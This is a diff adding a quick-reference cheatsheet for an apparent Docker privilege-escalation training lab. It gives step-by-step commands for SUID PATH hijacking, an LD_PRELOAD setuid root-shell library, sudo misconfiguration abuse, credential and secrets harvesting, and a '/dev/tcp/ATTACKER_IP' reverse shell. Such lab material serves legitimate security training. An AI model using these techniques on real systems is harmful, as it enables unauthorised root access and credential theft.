@@ -1,0 +1,494 @@
+═══════════════════════════════════════════════════════════════════════════════
+  ADVANCED PRIVILEGE ESCALATION LAB - QUICK REFERENCE CHEATSHEET
+═══════════════════════════════════════════════════════════════════════════════
+
+SETUP & DEPLOYMENT
+═══════════════════════════════════════════════════════════════════════════════
+
+Build Lab:
+  docker build -t privesc-lab .
+  OR: ./build.sh build-and-run
+
+Run Lab:
+  docker run -d --name privesc-lab -p 2222:22 privesc-lab
+  OR: ./build.sh run
+
+Docker Compose:
+  docker-compose up -d
+  OR: ./build.sh docker-compose-up
+
+Stop Lab:
+  docker stop privesc-lab
+  ./build.sh stop
+
+Clean Lab:
+  docker rm privesc-lab
+  docker rmi privesc-lab
+  ./build.sh clean
+
+Check Status:
+  docker ps | grep privesc-lab
+  ./build.sh status
+
+
+SSH ACCESS CREDENTIALS
+═══════════════════════════════════════════════════════════════════════════════
+
+SSH Connection:
+  ssh -p 2222 player1@localhost
+
+Quick Reference - All Users:
+  ┌────────────────┬─────────────────────┬──────────┐
+  │ User           │ Password            │ Purpose  │
+  ├────────────────┼─────────────────────┼──────────┤
+  │ player1        │ password123         │ Initial  │
+  │ backup         │ BackupPass@123      │ Stage 2  │
+  │ www-app        │ webpass@2024        │ Web      │
+  │ sysadmin       │ Admin@2024          │ System   │
+  │ devops         │ DevOps123#          │ DevOps   │
+  │ jenkins        │ JenkinsCI@2024      │ CI/CD    │
+  │ nginx          │ nginx123            │ Web Srv  │
+  └────────────────┴─────────────────────┴──────────┘
+
+Database Credentials:
+  PostgreSQL:
+    Host: localhost
+    User: pwner
+    Password: password123
+    DB: postgres
+    Port: 5432
+  
+  MySQL:
+    User: root
+    Password: SuperSecret@2024
+
+
+STAGE 1: INITIAL ACCESS
+═══════════════════════════════════════════════════════════════════════════════
+
+SSH Login:
+  ssh -p 2222 player1@localhost
+  password: password123
+
+Verify Access:
+  whoami                  # Output: player1
+  id                      # Check groups
+  groups                  # Output: player1 developers
+  hostname                # Output: privesc-lab
+
+Enumerate Users:
+  cat /etc/passwd
+  cut -d: -f1 /etc/passwd
+  getent passwd
+
+
+STAGE 2: CREDENTIAL DISCOVERY
+═══════════════════════════════════════════════════════════════════════════════
+
+Find Shared Directory:
+  ls -la /home/
+
+Read Credentials:
+  cat /home/shared/credentials.txt
+  grep -i "password" /home/shared/credentials.txt
+
+Discover Backup User:
+  ls -la /opt/backup/
+  su - backup
+  # Password: BackupPass@123
+
+Check Groups:
+  groups backup
+
+Enumerate Services:
+  ps aux | grep -E "postgres|mysql|nginx"
+  netstat -tlnp
+  ss -tlnp
+
+
+STAGE 3: SUID EXPLOITATION
+═══════════════════════════════════════════════════════════════════════════════
+
+Find SUID Binaries:
+  find /usr/local/bin -perm -4000 -type f
+  find / -perm -4000 -type f 2>/dev/null
+  ls -la /usr/local/bin/ | grep rwsr
+
+Analyze Binary:
+  file /usr/local/bin/run-backup
+  strings /usr/local/bin/run-backup
+  strings /usr/local/bin/run-backup | grep backup-runner
+
+Create Exploit Directory:
+  mkdir -p /tmp/exploit_path
+  mkdir -p /tmp/pwn
+
+Create Malicious Binary (Method 1 - Simple):
+  cat > /tmp/pwn/backup-runner << 'EOF'
+#!/bin/bash
+/bin/bash -i
+EOF
+  chmod +x /tmp/pwn/backup-runner
+
+Create Malicious Binary (Method 2 - Reverse Shell):
+  cat > /tmp/pwn/backup-runner << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+EOF
+  chmod +x /tmp/pwn/backup-runner
+
+Create Malicious Binary (Method 3 - Write File):
+  cat > /tmp/pwn/backup-runner << 'EOF'
+#!/bin/bash
+echo "pwned" > /tmp/pwned_$(date +%s).txt
+/bin/bash
+EOF
+  chmod +x /tmp/pwn/backup-runner
+
+Modify PATH:
+  export PATH=/tmp/pwn:$PATH
+  echo $PATH
+
+Verify PATH:
+  which backup-runner
+  type backup-runner
+
+Execute Vulnerable SUID:
+  /usr/local/bin/run-backup
+  # Should drop to shell as root
+
+Verify Privilege:
+  id                      # Check UID
+  whoami                  # Should be root
+
+Alternative: LD_PRELOAD Method:
+  cat > /tmp/lib.c << 'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+void __attribute__((constructor)) init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+EOF
+  gcc -shared -fPIC -o /tmp/lib.so /tmp/lib.c
+  LD_PRELOAD=/tmp/lib.so /usr/local/bin/check-user
+
+
+STAGE 4: DATABASE ACCESS
+═══════════════════════════════════════════════════════════════════════════════
+
+Check Services:
+  ps aux | grep postgres
+  netstat -tlnp | grep 5432
+
+Connect to PostgreSQL:
+  psql -h localhost -U pwner -d postgres
+  Password: password123
+
+PostgreSQL Commands:
+  \l                              # List databases
+  \dt                             # List tables
+  \d secret_flag                  # Describe table
+  SELECT * FROM secret_flag;      # View data
+  SELECT version();               # Check version
+  \q                              # Exit
+
+Query Database:
+  SELECT datname FROM pg_database;
+  SELECT usename, usesuper FROM pg_user;
+  SELECT * FROM pg_tables WHERE schemaname='public';
+
+Extract Flag:
+  SELECT * FROM secret_flag;
+  # Output: FLAG{stage_4_db_access}
+
+Alternative Connection:
+  psql --host=localhost --user=pwner --dbname=postgres
+
+
+STAGE 5: SECRETS EXTRACTION
+═══════════════════════════════════════════════════════════════════════════════
+
+Find Environment Files:
+  find / -name "*.env" 2>/dev/null
+  find / -name "*env.sh" 2>/dev/null
+  find /opt -type f 2>/dev/null
+
+Read Vault Secrets:
+  cat /opt/vault/env.sh
+
+Extract Variables:
+  source /opt/vault/env.sh
+  echo $API_KEY
+  echo $DB_ADMIN_PASS
+  echo $MASTER_SECRET
+
+Find Hardcoded Credentials:
+  grep -r "password\|secret\|key\|token" /opt --include="*.sh"
+  find /opt -type f -exec grep -l "password" {} \;
+
+Read Backup Scripts:
+  cat /opt/services/backup.sh
+  grep "DB_PASS" /opt/services/backup.sh
+
+Check Process Environment:
+  ps aux | head
+  strings /proc/[PID]/environ
+
+Search in Cron:
+  crontab -l
+  cat /etc/cron.d/*
+
+
+STAGE 6: SUDO MISCONFIGURATION
+═══════════════════════════════════════════════════════════════════════════════
+
+Check Sudo Capabilities:
+  sudo -l
+  sudo -l -U player1
+
+View Sudoers File:
+  cat /etc/sudoers
+  ls -la /etc/sudoers.d/
+  cat /etc/sudoers.d/vulnerable
+
+Check Group Membership:
+  groups
+  id -G
+
+Execute with Sudo (NOPASSWD):
+  sudo /usr/local/bin/run-backup
+  sudo /bin/bash
+  sudo /bin/sh
+
+Combine Sudo + SUID:
+  mkdir -p /tmp/combined
+  cat > /tmp/combined/backup-runner << 'EOF'
+#!/bin/bash
+/bin/bash -i
+EOF
+  chmod +x /tmp/combined/backup-runner
+  export PATH=/tmp/combined:$PATH
+  sudo /usr/local/bin/run-backup
+
+User Chain Escalation (Jenkins → Devops):
+  su - jenkins
+  # Password: JenkinsCI@2024
+  sudo -u devops /usr/local/bin/check-user
+  sudo -l  # Check further escalation
+
+Direct Bash via Sudo:
+  sudo /bin/bash
+  sudo /bin/bash -i
+  sudo -i
+
+
+STAGE 7: FINAL ROOT ACCESS
+═══════════════════════════════════════════════════════════════════════════════
+
+Verify Root Access:
+  id                              # uid=0(root)
+  whoami                          # root
+  hostname                        # privesc-lab
+
+Read Root-Only Files:
+  cat /root/.bashrc
+  cat /root/.bash_history
+  ls -la /root/
+
+Read Final Flag:
+  cat /root/.flag_final
+  # Output: FLAG{stage_7_kernel_privesc_root}
+
+Collect All Flags:
+  echo "Flag 1: Stage 1 (implicit from SSH)"
+  cat /home/shared/credentials.txt | grep FLAG
+  [ -f /tmp/.flag_s3 ] && cat /tmp/.flag_s3
+  psql -h localhost -U pwner -d postgres -c "SELECT * FROM secret_flag;"
+  source /opt/vault/env.sh && echo $MASTER_SECRET
+  [ -f /tmp/.flag_s6 ] && cat /tmp/.flag_s6
+  cat /root/.flag_final
+
+System Information:
+  uname -a                        # Kernel version
+  cat /etc/os-release             # OS info
+  ps aux                          # All processes
+  netstat -tlnp                   # All connections
+  mount                           # Mounted filesystems
+  df -h                           # Disk usage
+
+
+QUICK EXPLOITATION PATH
+═══════════════════════════════════════════════════════════════════════════════
+
+One-Liner Sequence (Manual):
+  1. ssh -p 2222 player1@localhost (password: password123)
+  2. cat /home/shared/credentials.txt
+  3. mkdir -p /tmp/pwn && echo '#!/bin/bash' > /tmp/pwn/backup-runner && \
+     echo '/bin/bash' >> /tmp/pwn/backup-runner && chmod +x /tmp/pwn/backup-runner
+  4. export PATH=/tmp/pwn:$PATH && /usr/local/bin/run-backup
+  5. id  # Verify root
+  6. cat /root/.flag_final  # Get final flag
+
+Complete Script Approach:
+  ./exploit-template.sh
+
+
+USEFUL UNIX/LINUX COMMANDS
+═══════════════════════════════════════════════════════════════════════════════
+
+File Operations:
+  ls -la [dir]                    # List files with details
+  find / -name [filename]         # Search for file
+  find / -perm -4000 -type f      # Find SUID binaries
+  cat [file]                      # Display file
+  grep [pattern] [file]           # Search in file
+  grep -r [pattern] [dir]         # Recursive search
+
+User Management:
+  whoami                          # Current user
+  id                              # User ID and groups
+  groups [user]                   # User groups
+  su - [user]                     # Switch user
+  sudo -l                         # Check sudo perms
+  sudo -u [user] [cmd]            # Run as user
+
+Process Management:
+  ps aux                          # List processes
+  ps aux | grep [pattern]         # Search processes
+  pgrep -l [pattern]              # Find process IDs
+  kill [PID]                      # Kill process
+
+Network:
+  netstat -tlnp                   # Show listening ports
+  ss -tlnp                        # Modern netstat
+  nc -l -p [port]                 # Netcat listener
+  curl [URL]                      # HTTP request
+  wget [URL]                      # Download file
+
+String/Data:
+  echo [text]                     # Print text
+  cat [file]                      # Display file
+  strings [binary]                # Extract strings from binary
+  od -c [file]                    # Octal dump
+
+System Info:
+  uname -a                        # System info
+  hostname                        # Hostname
+  whoami                          # Current user
+  pwd                             # Current directory
+  env                             # Environment variables
+
+
+EXPLOITATION TROUBLESHOOTING
+═══════════════════════════════════════════════════════════════════════════════
+
+SSH Connection Issues:
+  Q: "Connection refused"
+  A: Wait 60 seconds for SSH daemon to start
+     Check: docker ps | grep privesc-lab
+     Restart: docker restart privesc-lab
+
+SSH Password Issues:
+  Q: "Permission denied (publickey,password)"
+  A: Verify credentials:
+     User: player1
+     Pass: password123
+  Try: ssh -v -p 2222 player1@localhost
+
+SUID Exploit Not Working:
+  Q: "command not found" when running exploit
+  A: Ensure PATH is set correctly:
+     export PATH=/tmp/pwn:$PATH
+     which backup-runner  # Verify
+     /usr/local/bin/run-backup  # Use full path for binary
+
+Database Connection Issues:
+  Q: "could not connect to server"
+  A: Check if PostgreSQL is running:
+     docker exec privesc-lab service postgresql status
+     Verify credentials in /home/shared/credentials.txt
+
+Sudo Not Working:
+  Q: "not in sudoers"
+  A: Verify group membership:
+     groups  # Should show 'developers'
+     Check: cat /etc/sudoers.d/vulnerable
+     Ensure you're in developers group
+
+File Permissions Issues:
+  Q: "Permission denied" on file read
+  A: Check file permissions:
+     ls -la /file
+     For /home/shared/credentials.txt should be 644 (readable)
+
+
+IMPORTANT NOTES
+═══════════════════════════════════════════════════════════════════════════════
+
+1. PATHS: All exploits use /tmp/ to avoid conflicts
+2. PERMISSIONS: Don't modify system files unless necessary
+3. CLEANUP: Remember to clean up after testing
+4. DOCUMENTATION: Read README.md for full details
+5. SOLUTIONS: Check SOLUTION.md if completely stuck
+6. RESPONSIBLY: Use this knowledge ethically
+7. DOCKER: Ensure Docker daemon is running
+8. TIMEOUTS: Some services take time to start
+
+
+ADDITIONAL RESOURCES
+═══════════════════════════════════════════════════════════════════════════════
+
+Lab Documentation:
+  - README.md ........................ Complete lab overview
+  - QUICKSTART.md ..................... Fast setup guide
+  - SOLUTION.md ...................... Detailed solutions
+  - VULNERABILITIES.md .............. Technical analysis
+  - CHECKLIST.md .................... Verification guide
+  - INDEX.md ......................... Documentation index
+  - exploit-template.sh ............ Reference script
+
+External Resources:
+  - GTFOBins: https://gtfobins.github.io/
+  - HackTricks: https://book.hacktricks.xyz/
+  - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+  - OWASP: https://owasp.org/www-community/attacks/Privilege_escalation
+
+
+QUICK COMMAND REFERENCE BY STAGE
+═══════════════════════════════════════════════════════════════════════════════
+
+Stage 1 - SSH Access:
+  ssh -p 2222 player1@localhost  # password: password123
+
+Stage 2 - Credentials:
+  cat /home/shared/credentials.txt
+
+Stage 3 - SUID:
+  mkdir -p /tmp/pwn
+  echo '#!/bin/bash\n/bin/bash' > /tmp/pwn/backup-runner
+  chmod +x /tmp/pwn/backup-runner
+  export PATH=/tmp/pwn:$PATH
+  /usr/local/bin/run-backup
+
+Stage 4 - Database:
+  psql -h localhost -U pwner -d postgres
+  SELECT * FROM secret_flag;
+
+Stage 5 - Secrets:
+  source /opt/vault/env.sh
+  echo $MASTER_SECRET
+
+Stage 6 - Sudo:
+  sudo -l
+  sudo /usr/local/bin/run-backup
+
+Stage 7 - Root:
+  id  # uid=0(root)
+  cat /root/.flag_final
+
+
+═══════════════════════════════════════════════════════════════════════════════
+Good luck with your exploitation! Remember to learn from each stage.
+═══════════════════════════════════════════════════════════════════════════════
